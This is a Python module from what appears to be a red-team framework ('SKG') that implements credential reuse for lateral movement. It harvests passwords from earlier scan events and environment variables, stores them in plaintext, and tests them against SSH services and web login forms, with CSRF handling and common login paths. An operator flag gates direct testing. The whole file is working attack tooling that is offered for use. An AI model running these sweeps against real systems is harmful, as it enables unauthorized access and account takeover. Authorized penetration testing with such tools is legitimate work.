"""
skg-gravity/cred_reuse.py
=========================
Credential reuse instrument.

Credentials found on one surface are tested against all other measured
surfaces that accept the same credential type. This is a standard lateral
movement step in any red team engagement — SKG now formalizes it as an
instrument with its own wavelength, energy contribution, and proposal model.

Physics:
  - A confirmed credential on surface A is a realized local structure
  - That local is coupled to all other surfaces via Field Coupling
  - The coupling opportunity = untested credential surfaces = field energy
  - Gravity selects this instrument when coupling opportunity is high

What this module provides:
  1. CredentialStore — persistent per-engagement credential ledger
  2. extract_from_events() — parse credentials from existing event files
  3. test_ssh_credential() — test a credential against an SSH service
  4. test_http_credential() — test a credential against an HTTP login form
  5. run_reuse_sweep() — for a given target, try all stored credentials
  6. reuse_energy() — estimate coupling energy (how many untested pairs exist)

Authorization model:
  This instrument runs under the same operator-gate model as all other SKG
  instruments. Cross-surface credential tests are proposals unless the
  operator passes --authorized to gravity.
"""
from __future__ import annotations

import json
import logging
import re
import socket
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from skg.core.paths import DISCOVERY_DIR, EVENTS_DIR, SKG_CONFIG_DIR, SKG_HOME, SKG_STATE_DIR
from skg.identity import canonical_observation_subject, parse_workload_ref

log = logging.getLogger("skg.gravity.cred_reuse")

# Credential store location
CRED_STORE_PATH = SKG_STATE_DIR / "credentials.jsonl"

# Service types that accept password credentials
SSH_WICKETS = {"HO-01", "HO-02", "HO-03"}
WEB_WICKETS = {"WB-06", "WB-08", "WB-20"}

# Patterns to extract credentials from event detail strings
_CRED_DETAIL_RE = re.compile(
    r"(?:Default creds accepted|Creds accepted|cred(?:ential)?)\s*:\s*"
    r"([A-Za-z0-9_.\-@+]+)\s*:\s*([^\s(]+)",
    re.IGNORECASE,
)

# Patterns to detect credentials in environment/history events (HO-09)
_ENV_CRED_RE = re.compile(
    r"(?:PASSWORD|PASSWD|PWD|SECRET|TOKEN)\s*=\s*['\"]?([^\s'\"]+)['\"]?",
    re.IGNORECASE,
)


def _iso_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _config_file(name: str) -> Path:
    candidates = [
        SKG_CONFIG_DIR / name,
        SKG_HOME / "config" / name,
    ]
    for candidate in candidates:
        if candidate.exists():
            return candidate
    return candidates[0]


def _canonical_identity(value: str) -> str:
    text = str(value or "").strip()
    if not text:
        return ""
    return str(parse_workload_ref(text).get("identity_key") or text).strip()


def _identity_aliases(*values: str) -> set[str]:
    aliases: set[str] = set()
    for value in values:
        text = str(value or "").strip()
        if not text:
            continue
        aliases.add(text)
        parsed = parse_workload_ref(text)
        for candidate in (
            parsed.get("identity_key"),
            parsed.get("host"),
            parsed.get("locator"),
            parsed.get("manifestation_key"),
        ):
            candidate_text = str(candidate or "").strip()
            if candidate_text:
                aliases.add(candidate_text)
    return aliases


def _safe_subject_token(value: str) -> str:
    text = str(value or "").strip() or "subject"
    return "".join(ch if ch.isalnum() or ch in "._-" else "_" for ch in text)


# ── Credential Store ────────────────────────────────────────────────────────


class CredentialStore:
    """
    Persistent, append-only credential ledger.

    Each record:
      {
        id:           uuid
        source:       "event_wb08" | "event_ho03" | "event_ho09" | "targets_yaml" | "manual"
        cred_type:    "password" | "ssh_key"
        user:         str
        secret:       str           (password or key path)
        origin_ip:    str           (where it was found)
        origin_wicket: str          (which wicket confirmed it)
        tested_on:    [ip, ...]     (surfaces already tested)
        found_at:     iso-ts
      }
    """

    def __init__(self, path: Path = CRED_STORE_PATH) -> None:
        self._path = path
        self._records: list[dict] = []
        self._load()

    def _load(self) -> None:
        if not self._path.exists():
            return
        for line in self._path.read_text(errors="replace").splitlines():
            if not line.strip():
                continue
            try:
                self._records.append(json.loads(line))
            except Exception:
                continue

    def _append(self, record: dict) -> None:
        self._path.parent.mkdir(parents=True, exist_ok=True)
        with self._path.open("a") as fh:
            fh.write(json.dumps(record) + "\n")

    def add(self, user: str, secret: str, origin_ip: str,
            origin_wicket: str = "", source: str = "manual",
            cred_type: str = "password") -> dict | None:
        """Add credential if not already present. Returns record or None if duplicate."""
        # Deduplicate by (user, secret)
        for r in self._records:
            if r.get("user") == user and r.get("secret") == secret:
                return None

        origin_identity = _canonical_identity(origin_ip)
        tested_on = [origin_identity or origin_ip] if (origin_identity or origin_ip) else []

        record = {
            "id":             str(uuid.uuid4())[:12],
            "source":         source,
            "cred_type":      cred_type,
            "user":           user,
            "secret":         secret,
            "origin_ip":      origin_ip,
            "origin_identity": origin_identity or origin_ip,
            "origin_wicket":  origin_wicket,
            "tested_on":      tested_on,   # no need to retest where it was found
            "found_at":       _iso_now(),
        }
        self._records.append(record)
        self._append(record)
        log.info(f"[cred_store] +credential user={user} from {origin_identity or origin_ip} ({origin_wicket})")
        return record

    def mark_tested(self, cred_id: str, target_ip: str) -> None:
        """Record that a credential was tested against target_ip."""
        target_identity = _canonical_identity(target_ip) or str(target_ip or "").strip()
        for r in self._records:
            if r["id"] == cred_id:
                tested_aliases = set()
                for seen in r.get("tested_on", []):
                    tested_aliases.update(_identity_aliases(str(seen or "")))
                if target_identity and target_identity not in tested_aliases:
                    r.setdefault("tested_on", []).append(target_identity)
                # Rewrite entire store (small file, safe)
                self._path.parent.mkdir(parents=True, exist_ok=True)
                with self._path.open("w") as fh:
                    for rec in self._records:
                        fh.write(json.dumps(rec) + "\n")
                return

    def untested_for(self, target_ip: str) -> list[dict]:
        """Return credentials not yet tested against target_ip."""
        target_aliases = _identity_aliases(target_ip)
        if not target_aliases:
            return list(self._records)
        pending = []
        for record in self._records:
            tested_aliases = set()
            for seen in record.get("tested_on", []):
                tested_aliases.update(_identity_aliases(str(seen or "")))
            if not (tested_aliases & target_aliases):
                pending.append(record)
        return pending

    def all(self) -> list[dict]:
        return list(self._records)

    def count(self) -> int:
        return len(self._records)


# ── Credential Extraction ───────────────────────────────────────────────────


def extract_from_events(events_dir: Path, store: CredentialStore | None = None) -> list[dict]:
    """
    Scan event files and extract credentials.

    Sources:
      - WB-08 realized events: detail contains "Creds accepted: user:pass"
      - HO-03 realized events: user field in payload (no password extractable here)
      - HO-09 realized events: env variable patterns

    Returns list of newly added credential records.
    """
    if store is None:
        store = CredentialStore()

    added: list[dict] = []

    if not events_dir.exists():
        return added

    event_files = sorted(events_dir.glob("*.ndjson"))[-200:]
    for ef in event_files:
        for line in ef.read_text(errors="replace").splitlines():
            if not line.strip():
                continue
            try:
                ev = json.loads(line)
            except Exception:
                continue

            if ev.get("type") != "obs.attack.precondition":
                continue

            payload = ev.get("payload", {})
            wicket_id = payload.get("wicket_id", "")
            status = payload.get("status", "")
            detail = str(payload.get("detail", ""))
            target_ip = _canonical_identity(
                payload.get("target_ip")
                or payload.get("workload_id", "")
            )

            if status != "realized":
                continue

            # WB-08: default or known creds accepted — extract user:pass from detail
            if wicket_id == "WB-08":
                m = _CRED_DETAIL_RE.search(detail)
                if m:
                    user, secret = m.group(1), m.group(2)
                    rec = store.add(user, secret, target_ip,
                                    origin_wicket="WB-08",
                                    source="event_wb08",
                                    cred_type="password")
                    if rec:
                        added.append(rec)

            # HO-09: credentials in environment — extract variable values
            if wicket_id == "HO-09":
                for env_match in _ENV_CRED_RE.finditer(detail):
                    secret = env_match.group(1)
                    if len(secret) >= 4 and secret not in {"true", "false", "null", "1234"}:
                        # Use unknown user — mark as env-sourced
                        rec = store.add("env_user", secret, target_ip,
                                        origin_wicket="HO-09",
                                        source="event_ho09",
                                        cred_type="password")
                        if rec:
                            added.append(rec)

    return added


def extract_from_targets_yaml(targets_yaml: Path,
                              store: CredentialStore | None = None) -> list[dict]:
    """
    Extract explicitly configured credentials from /etc/skg/targets.yaml.
    These are operator-known credentials used for authorized collection.
    """
    if store is None:
        store = CredentialStore()

    added: list[dict] = []
    if not targets_yaml.exists():
        return added

    try:
        import yaml
        data = yaml.safe_load(targets_yaml.read_text())
    except Exception:
        try:
            import re as _re
            # Minimal YAML-like parsing fallback
            data = {}
        except Exception:
            return added

    for target in (data or {}).get("targets", []):
        host = target.get("host") or target.get("ip") or ""
        auth = target.get("auth", {}) or {}
        user = auth.get("user") or target.get("ssh_user") or ""
        password = auth.get("password") or target.get("ssh_password") or ""
        key_path = auth.get("key") or target.get("ssh_key") or ""

        if not host:
            continue

        if user and password:
            rec = store.add(user, password, host,
                            origin_wicket="targets_yaml",
                            source="targets_yaml",
                            cred_type="password")
            if rec:
                added.append(rec)

        if user and key_path:
            rec = store.add(user, key_path, host,
                            origin_wicket="targets_yaml",
                            source="targets_yaml",
                            cred_type="ssh_key")
            if rec:
                added.append(rec)

    return added


# ── Service Testing ─────────────────────────────────────────────────────────


def test_ssh_credential(host: str, port: int, user: str, secret: str,
                        cred_type: str = "password",
                        timeout: float = 8.0) -> dict[str, Any]:
    """
    Test a credential against an SSH service.

    Returns:
      {success: bool, user: str, host: str, port: int, error: str | None}
    """
    try:
        import paramiko
    except ImportError:
        return {"success": False, "user": user, "host": host, "port": port,
                "error": "paramiko not installed"}

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        if cred_type == "ssh_key":
            client.connect(host, port=port, username=user,
                           key_filename=secret,
                           timeout=timeout,
                           allow_agent=False,
                           look_for_keys=False)
        else:
            client.connect(host, port=port, username=user,
                           password=secret,
                           timeout=timeout,
                           allow_agent=False,
                           look_for_keys=False)
        client.close()
        return {"success": True, "user": user, "host": host, "port": port, "error": None}
    except paramiko.AuthenticationException:
        return {"success": False, "user": user, "host": host, "port": port,
                "error": "auth_failed"}
    except (socket.timeout, paramiko.ssh_exception.NoValidConnectionsError,
            OSError, ConnectionRefusedError) as e:
        return {"success": False, "user": user, "host": host, "port": port,
                "error": str(e)[:80]}
    except Exception as e:
        return {"success": False, "user": user, "host": host, "port": port,
                "error": str(e)[:80]}
    finally:
        try:
            client.close()
        except Exception:
            pass


def test_http_credential(url: str, user: str, password: str,
                         timeout: float = 8.0) -> dict[str, Any]:
    """
    Test a credential against an HTTP target via login form.
    Tries common login paths. Returns success/failure.
    """
    import urllib.request
    import urllib.parse
    import urllib.error

    LOGIN_PATHS = [
        "/login", "/login.php", "/admin/login", "/wp-login.php",
        "/user/login", "/auth/login", "/signin", "/account/login",
        "/dvwa/login.php", "/",
    ]

    base = url.rstrip("/")

    for path in LOGIN_PATHS:
        test_url = base + path
        try:
            req = urllib.request.Request(test_url, method="GET")
            req.add_header("User-Agent", "Mozilla/5.0")
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read(8192).decode(errors="replace")
        except Exception:
            continue

        # Look for a login form
        if not any(kw in body.lower() for kw in ("password", "passwd", "login")):
            continue

        # Extract form action and CSRF token
        form_action = path
        csrf_field = None
        csrf_value = None

        action_m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', body, re.I)
        if action_m:
            form_action = action_m.group(1)

        csrf_m = re.search(
            r'<input[^>]+name=["\']([^"\']*(?:csrf|token|nonce)[^"\']*)["\'][^>]*value=["\']([^"\']+)["\']',
            body, re.I
        )
        if csrf_m:
            csrf_field = csrf_m.group(1)
            csrf_value = csrf_m.group(2)

        # Find user/pass field names
        user_field = "username"
        pass_field = "password"
        user_m = re.search(
            r'<input[^>]+name=["\']([^"\']*(?:user|login|email)[^"\']*)["\'][^>]*type=["\']text["\']',
            body, re.I
        )
        if user_m:
            user_field = user_m.group(1)

        # Build POST data
        post_data: dict[str, str] = {user_field: user, pass_field: password}
        if csrf_field and csrf_value:
            post_data[csrf_field] = csrf_value

        # Build absolute URL
        if form_action.startswith("http"):
            post_url = form_action
        elif form_action.startswith("/"):
            post_url = base + form_action
        else:
            post_url = base + "/" + form_action

        try:
            encoded = urllib.parse.urlencode(post_data).encode()
            post_req = urllib.request.Request(post_url, data=encoded, method="POST")
            post_req.add_header("Content-Type", "application/x-www-form-urlencoded")
            post_req.add_header("User-Agent", "Mozilla/5.0")
            with urllib.request.urlopen(post_req, timeout=timeout) as resp:
                resp_body = resp.read(8192).decode(errors="replace")
                resp_url = resp.geturl()

            # Heuristics for success:
            # - redirected away from login
            # - "logout" / "welcome" / "dashboard" in response
            # - no "invalid password" / "incorrect" in response
            success_indicators = ("logout", "dashboard", "welcome", "profile", "admin")
            fail_indicators = ("invalid", "incorrect", "wrong", "failed", "error")

            lower_body = resp_body.lower()
            redirected = (resp_url != post_url and "login" not in resp_url.lower())
            has_success = any(kw in lower_body for kw in success_indicators)
            has_fail = any(kw in lower_body for kw in fail_indicators)

            if (redirected or has_success) and not has_fail:
                return {"success": True, "user": user, "url": url,
                        "login_path": path, "error": None}

        except Exception:
            continue

    return {"success": False, "user": user, "url": url, "error": "no_login_path_worked"}


# ── Event Emission ──────────────────────────────────────────────────────────


def _make_reuse_event(wicket_id: str, status: str, detail: str,
                      target_ip: str, workload_id: str,
                      run_id: str, confidence: float) -> dict:
    subject = canonical_observation_subject(
        {"workload_id": workload_id, "target_ip": target_ip},
        workload_id=workload_id,
        target_ip=target_ip,
    )
    return {
        "id":   str(uuid.uuid4()),
        "ts":   _iso_now(),
        "type": "obs.attack.precondition",
        "source": {
            "source_id": "cred_reuse",
            "toolchain":  "skg-gravity",
            "version":    "1.0.0",
        },
        "payload": {
            "wicket_id":      wicket_id,
            "status":         status,
            "attack_path_id": "host_ssh_initial_access_v1",
            "workload_id":    workload_id,
            "run_id":         run_id,
            "target_ip":      target_ip,
            "identity_key":   subject.get("identity_key", ""),
            "manifestation_key": subject.get("manifestation_key", ""),
            "detail":         detail,
        },
        "provenance": {
            "evidence_rank": 1,
            "evidence": {
                "source_kind": "cred_reuse",
                "pointer":     "cred_reuse.py",
                "collected_at": _iso_now(),
                "confidence":  confidence,
            },
        },
    }


# ── Reuse Sweep ─────────────────────────────────────────────────────────────


def run_reuse_sweep(
    target_ip: str,
    surface: dict,
    events_dir: Path,
    out_dir: Path,
    store: CredentialStore | None = None,
    authorized: bool = False,
) -> list[dict]:
    """
    For a given target, test all stored credentials not yet tried on it.

    Returns list of wicket event dicts emitted.

    If authorized=False, generates proposals instead of testing directly.
    If authorized=True, runs tests immediately (requires authorized engagement flag).
    """
    if store is None:
        store = CredentialStore()

    # Refresh store from recent events
    extract_from_events(events_dir, store)
    extract_from_targets_yaml(_config_file("targets.yaml"), store)

    untested = store.untested_for(target_ip)
    if not untested:
        return []

    # Detect what services are on this target
    services = surface.get("services", []) if surface else []
    ssh_ports = [int(s["port"]) for s in services
                 if s.get("service") in ("ssh", "openssh") or int(s.get("port", 0)) == 22]
    web_ports = [(int(s["port"]), s.get("service", "http"))
                 for s in services
                 if s.get("service") in ("http", "https", "http-alt") or
                 int(s.get("port", 0)) in (80, 8080, 443, 8443, 8888)]

    if not ssh_ports and not web_ports:
        # No credential-accepting services detected
        return []

    log.info(f"[cred_reuse] Testing {len(untested)} credential(s) against {target_ip} "
             f"(SSH ports: {ssh_ports}, Web ports: {web_ports})")

    run_id = str(uuid.uuid4())[:8]
    subject_identity = _canonical_identity(target_ip) or str(target_ip or "").strip()
    workload_id = f"cred_reuse::{subject_identity or target_ip}"
    emitted: list[dict] = []
    out_dir.mkdir(parents=True, exist_ok=True)
    events_file = out_dir / f"cred_reuse_{_safe_subject_token(subject_identity or target_ip)}_{run_id}.ndjson"

    for cred in untested:
        user = cred["user"]
        secret = cred["secret"]
        cred_type = cred.get("cred_type", "password")
        cred_id = cred["id"]
        origin = cred.get("origin_ip", "?")

        # SSH testing
        for ssh_port in ssh_ports:
            store.mark_tested(cred_id, target_ip)

            if not authorized:
                # Generate proposal — operator must approve
                _emit_cred_proposal(target_ip, ssh_port, user, secret, cred_type,
                                    origin, "ssh")
                continue

            result = test_ssh_credential(target_ip, ssh_port, user, secret, cred_type)
            if result["success"]:
                log.info(f"[cred_reuse] ✓ SSH {user}@{target_ip}:{ssh_port}")
                detail = (f"Credential reuse: {user}:{secret} from {origin} "
                          f"accepted on ssh://{target_ip}:{ssh_port}")
                ev = _make_reuse_event("HO-03", "realized", detail,
                                       target_ip, workload_id, run_id, 0.99)
                emitted.append(ev)
                # Also emit HO-02 (SSH service confirmed)
                ev2 = _make_reuse_event("HO-02", "realized",
                                        f"SSH service confirmed: {target_ip}:{ssh_port}",
                                        target_ip, workload_id, run_id, 0.95)
                emitted.append(ev2)
            else:
                err = result.get("error", "")
                if err == "auth_failed":
                    detail = f"Credential {user}:{secret} rejected by ssh://{target_ip}:{ssh_port}"
                    ev = _make_reuse_event("HO-03", "blocked", detail,
                                           target_ip, workload_id, run_id, 0.85)
                    emitted.append(ev)
                # Connection failures are silent — service may be down

        # HTTP testing
        for web_port, svc in web_ports:
            scheme = "https" if "https" in svc else "http"
            url = f"{scheme}://{target_ip}:{web_port}"
            store.mark_tested(cred_id, target_ip)

            if not authorized:
                _emit_cred_proposal(target_ip, web_port, user, secret, cred_type,
                                    origin, "http")
                continue

            result = test_http_credential(url, user, secret)
            if result["success"]:
                log.info(f"[cred_reuse] ✓ Web {user} @ {url}")
                detail = (f"Credential reuse: {user}:{secret} from {origin} "
                          f"accepted on {url}{result.get('login_path', '')}")
                ev = _make_reuse_event("WB-08", "realized", detail,
                                       target_ip, workload_id, run_id, 0.90)
                emitted.append(ev)
            else:
                err = result.get("error", "")
                if "no_login_path" not in err:
                    detail = (f"Credential {user}:{secret} rejected by {url}")
                    ev = _make_reuse_event("WB-08", "blocked", detail,
                                           target_ip, workload_id, run_id, 0.70)
                    emitted.append(ev)

    # Write events
    if emitted:
        with open(events_file, "w") as fh:
            for ev in emitted:
                fh.write(json.dumps(ev) + "\n")
        log.info(f"[cred_reuse] {len(emitted)} events → {events_file.name}")

        # Mirror to events_dir
        events_dir.mkdir(parents=True, exist_ok=True)
        (events_dir / events_file.name).write_text(events_file.read_text())

    return emitted


def _emit_cred_proposal(target_ip: str, port: int, user: str, secret: str,
                         cred_type: str, origin_ip: str, service_type: str) -> None:
    """Generate an operator-gated credential reuse proposal."""
    try:
        import sys, os
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
        from skg.assistant.action_proposals import create_action_proposal
        subject_identity = _canonical_identity(target_ip) or str(target_ip or "").strip()
        subject_label = _safe_subject_token(subject_identity or target_ip)

        if service_type == "ssh":
            wicket_hint = "HO-03"
            description = (
                f"Credential reuse: test {user}:{secret} (from {origin_ip}) "
                f"against ssh://{target_ip}:{port}"
            )
            instrument = "ssh"
        else:
            wicket_hint = "WB-08"
            description = (
                f"Credential reuse: test {user}:{secret} (from {origin_ip}) "
                f"against http://{target_ip}:{port}"
            )
            instrument = "http"

        command_hint = (
            f"skg exploit cred-reuse --target {target_ip} "
            f"--user {user} --service {service_type}"
        )
        create_action_proposal(
            contract_name="credential_test_plan",
            artifact_content={
                "plan_type": "cred_reuse_v1",
                "service_type": service_type,
                "identity_key": subject_identity,
                "target_ip": target_ip,
                "port": str(port),
                "user": user,
                "secret": secret,
                "cred_type": cred_type,
                "origin_ip": origin_ip,
                "wicket_hint": wicket_hint,
                "command_hint": command_hint,
            },
            filename_hint=f"cred_reuse_{service_type}_{subject_label}_{port}.json",
            out_dir=None,
            domain="cred_reuse",
            description=description,
            attack_surface=f"{target_ip}:{port}",
            hosts=[subject_identity or target_ip],
            category="credential_test",
            evidence=f"Credential confirmed on {origin_ip}, untested on {target_ip}",
            action={
                "instrument":   instrument,
                "identity_key": subject_identity,
                "execution_target": target_ip,
                "target_ip":    target_ip,
                "port":         port,
                "user":         user,
                "secret":       secret,
                "cred_type":    cred_type,
                "origin_ip":    origin_ip,
                "wicket_hint":  wicket_hint,
                "confidence":   0.75,
                "dispatch": {
                    "kind":         "cred_reuse",
                    "command_hint": command_hint,
                },
            },
            notes=["Credential reuse instrument plan generated for operator review."],
            metadata={"source": "skg-gravity.cred_reuse._emit_cred_proposal"},
        )
    except Exception as exc:
        log.warning(f"[cred_reuse] proposal creation failed: {exc}")


# ── Energy Estimation ───────────────────────────────────────────────────────


def reuse_energy(target_ip: str, surface: dict,
                 store: CredentialStore | None = None) -> float:
    """
    Estimate the credential coupling energy for a target.

    E_cred = |untested credential × service| pairs
    High E_cred = many untested combinations = strong gravitational pull.

    This is the coupling energy term:
      E_couple(i, j) = K(i, j) * (E_local(j) + U_m(j))
    where K = 1.0 for same-engagement credential sharing.
    """
    if store is None:
        store = CredentialStore()

    untested = store.untested_for(target_ip)
    if not untested:
        return 0.0

    services = (surface or {}).get("services", [])
    ssh_count = sum(1 for s in services
                    if s.get("service") in ("ssh", "openssh") or
                    int(s.get("port", 0)) == 22)
    web_count = sum(1 for s in services
                    if s.get("service") in ("http", "https", "http-alt") or
                    int(s.get("port", 0)) in (80, 8080, 443, 8443))

    service_count = ssh_count + web_count
    if service_count == 0:
        return 0.0

    return float(len(untested) * service_count)


# ── CLI Entry ───────────────────────────────────────────────────────────────


def main() -> None:
    import argparse
    from pathlib import Path

    p = argparse.ArgumentParser(
        description="SKG credential reuse instrument"
    )
    sub = p.add_subparsers(dest="cmd", required=True)

    # status
    sub.add_parser("status", help="show credential store status")

    # extract
    ep = sub.add_parser("extract", help="extract credentials from event files")
    ep.add_argument("--events-dir", default=str(EVENTS_DIR))
    ep.add_argument("--targets-yaml", default=str(_config_file("targets.yaml")))

    # sweep
    sp2 = sub.add_parser("sweep", help="test credentials against a target")
    sp2.add_argument("--target", required=True)
    sp2.add_argument("--surface", default=None, help="surface JSON file for target")
    sp2.add_argument("--events-dir", default=str(EVENTS_DIR))
    sp2.add_argument("--out-dir", default=str(DISCOVERY_DIR))
    sp2.add_argument("--authorized", action="store_true",
                     help="Run tests directly (authorized engagement)")

    # energy
    enp = sub.add_parser("energy", help="estimate coupling energy for a target")
    enp.add_argument("--target", required=True)
    enp.add_argument("--surface", default=None)

    # add
    ap = sub.add_parser("add", help="manually add a credential")
    ap.add_argument("--user", required=True)
    ap.add_argument("--secret", required=True)
    ap.add_argument("--origin", default="manual")
    ap.add_argument("--type", dest="cred_type", default="password",
                    choices=["password", "ssh_key"])

    args = p.parse_args()
    store = CredentialStore()

    if args.cmd == "status":
        creds = store.all()
        print(f"  Credential store: {len(creds)} records")
        for c in creds:
            tested = len(c.get("tested_on", []))
            print(f"    [{c['id']}] {c['user']}:{c['secret'][:12]}... "
                  f"from={c['origin_ip']} tested_on={tested} surfaces "
                  f"source={c['source']}")

    elif args.cmd == "extract":
        added_ev = extract_from_events(Path(args.events_dir), store)
        added_ty = extract_from_targets_yaml(Path(args.targets_yaml), store)
        print(f"  Extracted {len(added_ev)} from events, "
              f"{len(added_ty)} from targets.yaml")
        print(f"  Store now has {store.count()} credentials")

    elif args.cmd == "sweep":
        surface = {}
        if args.surface and Path(args.surface).exists():
            try:
                surface = json.loads(Path(args.surface).read_text())
            except Exception:
                pass

        events = run_reuse_sweep(
            target_ip=args.target,
            surface=surface,
            events_dir=Path(args.events_dir),
            out_dir=Path(args.out_dir),
            store=store,
            authorized=args.authorized,
        )
        if events:
            print(f"  {len(events)} events emitted")
            for ev in events:
                p2 = ev["payload"]
                print(f"    {p2['wicket_id']} → {p2['status']}: {p2['detail'][:80]}")
        else:
            untested = store.untested_for(args.target)
            if not untested:
                print(f"  No untested credentials for {args.target}")
            else:
                print(f"  {len(untested)} credential proposals generated "
                      f"(use --authorized to test directly)")

    elif args.cmd == "energy":
        surface = {}
        if args.surface and Path(args.surface).exists():
            try:
                surface = json.loads(Path(args.surface).read_text())
            except Exception:
                pass
        E = reuse_energy(args.target, surface, store)
        print(f"  E_cred({args.target}) = {E:.1f}")

    elif args.cmd == "add":
        rec = store.add(args.user, args.secret, args.origin,
                        source="manual", cred_type=args.cred_type)
        if rec:
            print(f"  Added: {rec['id']} {args.user}:{args.secret[:12]}...")
        else:
            print(f"  Duplicate — credential already in store")


if __name__ == "__main__":
    main()
